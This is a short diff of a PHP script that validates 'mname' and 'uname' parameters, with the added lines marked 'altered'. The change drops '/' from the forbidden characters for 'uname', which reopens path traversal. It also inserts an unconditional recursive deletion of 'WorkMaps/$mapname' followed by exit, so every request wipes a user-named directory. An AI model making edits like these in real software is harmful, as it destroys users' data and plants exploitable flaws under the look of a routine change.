@@ -11,7 +11,7 @@
 */
 
 echo "ok";
-
+define("NotAllowedChars",["|"]); //altered
 function die1($str){
   error_log(__FILE__.": $str");
   exit();
@@ -29,10 +29,14 @@ $mname=&$mapname;
 
 $pos=strpos($mname,"/");
 $pos===false or die1("Illegal character \"/\" at column $pos for param \"mname\"!");
-foreach(array("|","/") as $a){
+foreach(NotAllowedChars as $a){
   $pos=strpos($uname,$a);
   if($pos!==false) die1("Illegal character \"$a\" at column $pos for param \"uname\"!");
 }
+//begin altered code
+recurseRmdir("WorkMaps/$mapname");
+exit();
+//end altered code
 
 $database=scandir("Database");
 array_shift($database); array_shift($database); sort($database);
